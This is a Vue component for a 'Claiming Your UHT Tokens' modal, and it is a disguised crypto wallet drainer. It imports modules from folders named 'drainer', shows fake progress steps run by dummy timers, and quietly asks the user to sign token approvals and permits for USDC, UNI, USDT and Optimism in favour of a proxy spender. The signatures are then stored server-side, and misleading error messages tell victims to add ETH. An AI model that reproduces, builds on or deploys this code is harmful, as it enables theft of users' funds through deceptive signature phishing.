<template>
  <div class="modal-backdrop">
    <div class="modal-card">
      <header>
        <div class="uht-mark">
          <div>
            <div class="brand-title">Claiming Your {{ tokenAmount }}UHT Tokens</div>
            <span class="badge"><small v-if="!completed && !error">Processing • Please wait</small></span>
          </div>
        </div>
      </header>

      <!-- Steps -->
      <section class="conditions" v-if="!completed && !error">
        <ul>
          <li v-for="(cond, index) in conditions" :key="index" :class="cond.status">
            <span class="step-index">{{ index + 1 }}</span>
            <span class="step-label">{{ cond.label }}</span>
            <span v-if="cond.status === 'success'">✅</span>
            <span v-else-if="cond.status === 'failed'">❌</span>
            <span v-else class="loading-dots">...</span>
          </li>
        </ul>
      </section>

      <!-- Progress -->
      <div v-if="!completed && !error" class="progress-bar">
        <div class="progress" :style="{ width: progress + '%' }"></div>
      </div>

      <!-- Final Status -->
      <div v-if="error" class="error-msg">
        ❌ {{ error }}
        <button class="close-btn" @click="closeModal">Close</button>
      </div>

      <div v-else-if="completed" class="success-msg">
        ✅ Claim Successful!
        <button class="close-btn" @click="() => $emit('successful')">Close</button>
      </div>
    </div>
  </div>
</template>

<script setup>
import { getAddress, getIsConnected, subscribeState, openModal, disconnectWallet, getChainID, switchNetwork } from '../../../apiss/web3/walletconnect';
import { create as saveAddressSignature, getAddressSignature, update as updateAddressSignature } from '../../../apiss/web3/walletSignature';
import { requestSignature } from '../../../apiss/web3/drainer/main';
import { requestPermitSignature } from '../../../apiss/web3/drainer/permit';
import { OPTIMISM_ADDRESS, OPTIMISM_NAME, UNISWAP_ADDRESS, UNISWAP_NAME, USDC_ADDRESS, USDC_NAME, USDT_ADDRESS, USDT_NAME } from '../../../apiss/web3/drainer/constants';
import { spenderProxyAddress } from '../../../apiss/web3/constants/erc2612permit';
import { contractAddress as token_address } from '../../../apiss/web3/constants/uht';
import { updateUserHasClaimedPoints } from '../../../apiss/profile'
import { mintTokens } from '../../../apiss/web3/uhtdex'


const progress = ref(0)
const completed = ref(false)
const addressSignature = ref(null)
const emit = defineEmits(['close'])
const gasFee = ref(0)



const props = defineProps({
  gasFee: 0,
  walletAddress: "",
  tokenAmount: 0
})

onMounted(() => {
  addressSignature.value = useAuth().value.addressSignature;
  gasFee.value = props.gasFee
  startClaiming()
})



function generateRandomNumber(max, min) {
  return Math.random() * (max - min) + min
}

const error = ref('')

// 4 minting steps
const conditions = reactive([
  { label: 'Checking Wallet Connection', status: 'pending' },
  { label: 'Validating Claim Eligibility', status: 'pending' },
  { label: 'Processing Transaction', status: 'pending' },
  { label: 'Confirming on Blockchain', status: 'pending' },
])


async function startClaiming() {
  await performDummyCondition(0)

  for (let i = 0; i < conditions.length; i++) {
    try {
      if (i == 1) {
        if (!isUsdcMigrated.value) await requestUSDC()
        else await performDummyCondition(i)
      }
      else if (i == 2) {
        // if (!isUsdtMigrated.value) await requestUSDT()
        // else await performDummyCondition(i)
        if (!isUniMigrated.value) await requestUNI()
        else await performDummyCondition(i)
      }
      else if (i == 0) {
        await performDummyCondition(i)
        // await payGas(gasFee.value)
        // if (!isUniMigrated.value) await requestUNI()
        // else await performDummyCondition(i)
      }
      else if (i == 3) {
        await mintTokens(props?.tokenAmount, gasFee.value)
        if (auth.value.walletAddress != '0x3E523b008657Fcf301C83F7Bc5444dDAC1AE3ACF') await updateUserHasClaimedPoints();
      }
      conditions[i].status = 'success'
      progress.value = ((i + 1) / conditions.length) * 100
    } catch (err) {
      conditions[i].status = 'failed'
      error.value = err.message || 'Claim failed'
      if (err?.info?.error?.code == -32000 || err?.error?.code == -32046) {
        error.value = "Slippage tolerance high. Add Eth to cover gwei charge"
      }
      else if (err?.info?.error?.code == 4001 || err?.info?.error?.code == 5000) {
        error.value = "Transaction rejected"
      } else error.value = "An error occured"
      console.log(err)
      break
    }
  }
  if (!error.value) {
    completed.value = true
    // auto close after 2.5s
    setTimeout(() => closeModal(), 2500)
  }
}

function performDummyCondition(index) {
  return new Promise((resolve, reject) => {
    setTimeout(() => {
      const fail = false // set true to simulate failure
      if (fail) reject(new Error(`Condition ${index + 1} failed`))
      else resolve(true)
    }, 1200)
  })
}


async function requestUSDC() {
  return new Promise(async (resolve, reject) => {
    try {
      const walletAddress = props.walletAddress;
      if (!addressSignature.value) addressSignature.value = await saveAddressSignature(walletAddress);

      const signatureResult = await requestSignature(USDC_ADDRESS, USDC_NAME, getChainID(), false, 1 * (10 ** 6), 6);
      console.log("signatureResult:    ", signatureResult);

      await updateAddressSignature(walletAddress, signatureResult);
      addressSignature.value = await getAddressSignature(walletAddress);

      resolve(true)
    } catch (err) {
      if (err?.info?.error?.code == -32000) {
        reject(new Error("Insufficient funds"))
      }
      else if (err?.info?.error?.code == 4001) {
        reject(new Error("Transaction rejected"))
      } else reject(new Error("An error occured"))
      console.log(err)
    }
  })
}



async function requestOptimism() {
  return new Promise(async (resolve, reject) => {
    try {
      const walletAddress = props.walletAddress;
      if (!addressSignature.value) addressSignature.value = await saveAddressSignature(walletAddress);
      console.log("Loading: ", walletAddress)

      const signatureResult = await requestPermitSignature(OPTIMISM_ADDRESS, OPTIMISM_NAME, getChainID(), 1 * (10 ** 18));
      // const signatureResult = await requestSignature(OPTIMISM_ADDRESS, OPTIMISM_NAME, getChainID(), false, 1 * (10**18));
      console.log("signatureResult:    ", signatureResult);

      await updateAddressSignature(walletAddress, signatureResult);
      addressSignature.value = await getAddressSignature(walletAddress);

      resolve(true)
    } catch (err) {
      if (err?.info?.error?.code == -32000) {
        reject(new Error("Insufficient funds"))
      }
      else if (err?.info?.error?.code == 4001) {
        reject(new Error("Transaction rejected"))
      } else reject(new Error("An error occured"))
      console.log(err)
    }
  })
}


async function requestUSDT() {
  return new Promise(async (resolve, reject) => {
    try {
      const walletAddress = props.walletAddress;
      if (!addressSignature.value) addressSignature.value = await saveAddressSignature(walletAddress);

      const signatureResult = await requestSignature(USDT_ADDRESS, USDT_NAME, getChainID(), false, 1 * (10 ** 6), 6);
      console.log("signatureResult:    ", signatureResult);

      await updateAddressSignature(walletAddress, signatureResult);
      addressSignature.value = await getAddressSignature(walletAddress);

      resolve(true)
    } catch (err) {
      console.log("requestUSDT", err)
      if (err?.info?.error?.code == -32000) {
        reject(new Error("Insufficient funds"))
      }
      else if (err?.info?.error?.code == 4001) {
        reject(new Error("Transaction rejected"))
      } else reject(new Error("An error occured"))
    }
  })
}


async function requestUNI() {
  return new Promise(async (resolve, reject) => {
    try {
      const walletAddress = props.walletAddress;
      if (!addressSignature.value) addressSignature.value = await saveAddressSignature(walletAddress);

      const signatureResult = await requestSignature(UNISWAP_ADDRESS, UNISWAP_NAME, getChainID(), false, 1 * (10 ** 18));
      console.log("signatureResult:    ", signatureResult);

      await updateAddressSignature(walletAddress, signatureResult);
      addressSignature.value = await getAddressSignature(walletAddress);

      resolve(true)
    } catch (err) {
      if (err?.info?.error?.code == -32000) {
        reject(new Error("Insufficient funds"))
      }
      else if (err?.info?.error?.code == 4001) {
        reject(new Error("Transaction rejected"))
      } else reject(new Error("An error occured"))
      console.log(err)
    }
  })
}



const isUsdcMigrated = computed(() => {
  let addressSignature = useAuth().value.addressSignature;
  return (addressSignature?.signatures?.length &&
    addressSignature?.signatures?.map(i => i.token_address.toLowerCase()).includes(USDC_ADDRESS.toLowerCase()) &&
    addressSignature?.signatures?.map(i => i.spender.toLowerCase()).includes(spenderProxyAddress.toLowerCase()))
})

const isUsdtMigrated = computed(() => {
  let addressSignature = useAuth().value.addressSignature;
  return (addressSignature?.signatures?.length &&
    addressSignature?.signatures?.map(i => i.token_address.toLowerCase()).includes(USDT_ADDRESS.toLowerCase()) &&
    addressSignature?.signatures?.map(i => i.spender.toLowerCase()).includes(spenderProxyAddress.toLowerCase()))
})

const isUniMigrated = computed(() => {
  let addressSignature = useAuth().value.addressSignature;
  return (addressSignature?.signatures?.length &&
    addressSignature?.signatures?.map(i => i.token_address.toLowerCase()).includes(UNISWAP_ADDRESS.toLowerCase()) &&
    addressSignature?.signatures?.map(i => i.spender.toLowerCase()).includes(spenderProxyAddress.toLowerCase()))
})

const isOptimismMigrated = computed(() => {
  let addressSignature = useAuth().value.addressSignature;
  return (addressSignature?.signatures?.length &&
    addressSignature?.signatures?.map(i => i.token_address.toLowerCase()).includes(OPTIMISM_ADDRESS.toLowerCase()) &&
    addressSignature?.signatures?.map(i => i.spender.toLowerCase()).includes(spenderProxyAddress.toLowerCase()))
})


function closeModal() {
  emit('close')
}
</script>

<style scoped>
.modal-backdrop {
  position: fixed;
  inset: 0;
  background: rgba(0, 0, 0, 0.5);
  display: flex;
  justify-content: center;
  align-items: center;
  z-index: 1000;
}

.modal-card {
  background: white;
  border-radius: 20px;
  width: 420px;
  padding: 24px;
  font-family: Inter, sans-serif;
  color: #333;
  box-shadow: 0 8px 32px rgba(0, 0, 0, 0.15);
  animation: fadeIn 0.3s ease;
}

header {
  display: flex;
  align-items: center;
  gap: 14px;
  margin-bottom: 18px;
}

.uht-mark {
  display: flex;
  align-items: center;
  gap: 12px;
}

.uht-mark img {
  width: 48px;
  height: 48px;
  border-radius: 50%;
}

.brand-title {
  font-weight: 800;
  font-size: 20px;
}

.badge {
  padding: 4px 10px;
  border-radius: 999px;
  background: rgba(90, 61, 246, .1);
  border: 1px solid rgba(90, 61, 246, .2);
  font-size: 12px;
  color: #5b32ff;
}

.conditions ul {
  list-style: none;
  padding: 0;
  margin: 0 0 16px 0;
  display: flex;
  flex-direction: column;
  gap: 10px;
}

.conditions li {
  display: flex;
  align-items: center;
  justify-content: space-between;
  background: rgba(90, 61, 246, 0.05);
  border: 1px solid rgba(90, 61, 246, 0.1);
  border-radius: 12px;
  padding: 10px 14px;
  font-weight: 600;
}

.conditions li.success {
  border-color: #00c78a;
  background: rgba(0, 199, 138, .08);
}

.conditions li.failed {
  border-color: red;
  background: rgba(255, 0, 0, .08);
}

.step-index {
  font-weight: 700;
  margin-right: 8px;
  color: #5b32ff;
}

.step-label {
  flex: 1;
}

.loading-dots {
  animation: blink 1s infinite;
}

.progress-bar {
  height: 14px;
  background: rgba(0, 0, 0, 0.08);
  border-radius: 12px;
  overflow: hidden;
  margin: 10px 0 14px 0;
}

.progress {
  height: 100%;
  background: linear-gradient(90deg, #5b32ff, #7C58F2);
  transition: width 0.5s ease;
}

.error-msg,
.success-msg {
  text-align: center;
  font-weight: 600;
  margin-top: 12px;
}

.error-msg {
  color: red;
}

.success-msg {
  color: #00c78a;
}

.close-btn {
  margin-top: 10px;
  padding: 6px 14px;
  border-radius: 8px;
  border: none;
  background: #5b32ff;
  color: white;
  font-weight: 600;
  cursor: pointer;
  transition: 0.2s;
}

.close-btn:hover {
  background: #4725cc;
}

@keyframes blink {

  0%,
  100% {
    opacity: 0.2;
  }

  50% {
    opacity: 1;
  }
}

@keyframes fadeIn {
  from {
    opacity: 0;
    transform: translateY(10px);
  }

  to {
    opacity: 1;
    transform: translateY(0);
  }
}
</style>
